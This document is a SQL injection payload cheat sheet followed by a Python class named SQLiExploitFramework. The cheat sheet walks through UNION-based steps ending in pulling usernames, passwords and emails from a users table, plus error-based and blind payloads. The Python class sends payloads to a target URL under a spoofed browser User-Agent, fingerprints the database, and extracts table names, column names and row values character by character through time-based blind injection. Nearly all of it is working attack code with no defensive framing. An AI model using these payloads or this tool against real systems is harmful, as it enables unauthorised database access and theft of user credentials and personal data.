/* Standard SQLi Payload Construction for UNION-based Information Disclosure */

/* Step 1: Determine number of columns using ORDER BY */
' ORDER BY 1-- 
' ORDER BY 2-- 
... until error occurs (e.g., if ORDER BY 5 causes error, then 4 columns)

/* Step 2: Confirm column count with UNION SELECT */
' UNION SELECT NULL,NULL,NULL,NULL-- 

/* Step 3: Identify exploitable columns (those that render output) */
' UNION SELECT 'test1','test2','test3','test4'-- 

/* Step 4: Extract database version, user, and schema info */
' UNION SELECT version(), user(), database(), NULL-- 

/* Step 5: Extract table names from information_schema */
' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1-- 

/* Step 6: Extract column names from target table */
' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 0,1-- 

/* Step 7: Extract actual data */
' UNION SELECT username, password, email, NULL FROM users--

/* For Error-Based Injection (if UNION is filtered): */
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

/* For Blind Boolean Injection (if no output): */
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'--

/* All payloads assume proper URL encoding and comment termination (--) or (/*) */

import requests
import re
import time
from urllib.parse import urljoin, urlencode

class SQLiExploitFramework:
    def __init__(self, target_url, param_name, timeout=10, delay=0.5):
        self.target_url = target_url
        self.param_name = param_name
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
        })

    def test_injection(self, payload):
        params = {self.param_name: payload}
        try:
            r = self.session.get(self.target_url, params=params, timeout=self.timeout)
            return r.text, r.status_code
        except Exception as e:
            return str(e), 0

    def detect_db_type(self):
        db_fingerprint_payloads = {
            'MySQL': "' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT MID((IFNULL(CAST(database() AS CHAR),0x20)),1,50)),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
            'PostgreSQL': "' AND (SELECT CASE WHEN (SELECT version()) IS NOT NULL THEN 1 ELSE 1/0 END) AND '1'='1",
            'SQLServer': "' AND (SELECT COUNT(*) FROM sysobjects) > 0 AND '1'='1",
            'Oracle': "' AND (SELECT COUNT(*) FROM dual) > 0 AND '1'='1"
        }
        for db, payload in db_fingerprint_payloads.items():
            resp, status = self.test_injection(payload)
            if status == 200 and ('71626a7a71' not in resp and '0x71626a7a71' not in resp):  # Fallback heuristic
                if any(kw in resp for kw in ['MySQL', 'PostgreSQL', 'SQLServer', 'Oracle', 'ORA-', 'Microsoft SQL Server', 'psql']):
                    return db
        return 'Unknown'

    def blind_time_based_injection(self, condition, delay=5):
        payload = f"' AND IF({condition}, SLEEP({delay}), 0) AND '1'='1"
        start = time.time()
        self.test_injection(payload)
        elapsed = time.time() - start
        return elapsed >= delay

    def extract_table_names(self, db_type):
        tables = []
        if db_type == 'MySQL':
            base_query = "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT %d,1)"
        elif db_type == 'PostgreSQL':
            base_query = "(SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET %d)"
        else:
            return []
        for i in range(50):
            payload = f"' AND (SELECT CASE WHEN (LENGTH({base_query % i}) > 0) THEN 1 ELSE 1/0 END) AND '1'='1"
            resp, _ = self.test_injection(payload)
            if 'ERROR' not in resp and 'SQL' not in resp:
                # Use blind binary search or length-based extraction
                for j in range(1, 50):
                    if self.blind_time_based_injection(f"LENGTH({base_query % i}) >= {j}", 3):
                        continue
                    else:
                        table_len = j - 1
                        if table_len == 0:
                            break
                        table_name = ''
                        for k in range(1, table_len + 1):
                            for c in range(32, 127):
                                if self.blind_time_based_injection(f"ASCII(SUBSTRING({base_query % i}, {k}, 1)) = {c}", 3):
                                    table_name += chr(c)
                                    break
                        if table_name:
                            tables.append(table_name)
                        break
        return tables

    def extract_column_names(self, table_name, db_type):
        columns = []
        if db_type == 'MySQL':
            base_query = f"(SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT %d,1)"
        elif db_type == 'PostgreSQL':
            base_query = f"(SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET %d)"
        else:
            return []
        for i in range(50):
            if self.blind_time_based_injection(f"EXISTS({base_query % i})", 3):
                for j in range(1, 50):
                    if self.blind_time_based_injection(f"LENGTH({base_query % i}) >= {j}", 3):
                        continue
                    else:
                        col_len = j - 1
                        if col_len == 0:
                            break
                        col_name = ''
                        for k in range(1, col_len + 1):
                            for c in range(32, 127):
                                if self.blind_time_based_injection(f"ASCII(SUBSTRING({base_query % i}, {k}, 1)) = {c}", 3):
                                    col_name += chr(c)
                                    break
                        if col_name:
                            columns.append(col_name)
                        break
        return columns

    def extract_data(self, table_name, column_names, db_type, limit=1):
        data = []
        for col in column_names:
            if db_type == 'MySQL':
                base_query = f"(SELECT {col} FROM {table_name} LIMIT %d,1)"
            elif db_type == 'PostgreSQL':
                base_query = f"(SELECT {col} FROM {table_name} LIMIT 1 OFFSET %d)"
            for i in range(limit):
                if self.blind_time_based_injection(f"EXISTS({base_query % i})", 3):
                    extracted_val = ''
                    for j in range(1, 100):
                        if self.blind_time_based_injection(f"LENGTH({base_query % i}) >= {j}", 3):
                            continue
                        else:
                            val_len = j - 1
                            if val_len == 0:
                                break
                            for k in range(1, val_len + 1):
                                for c in range(32, 127):
                                    if self.blind_time_based_injection(f"ASCII(SUBSTRING({base_query % i}, {k}, 1)) = {c}", 3):
                                        extracted_val += chr(c)
                                        break
                            data.append({col: extracted_val})
                            break
        return data

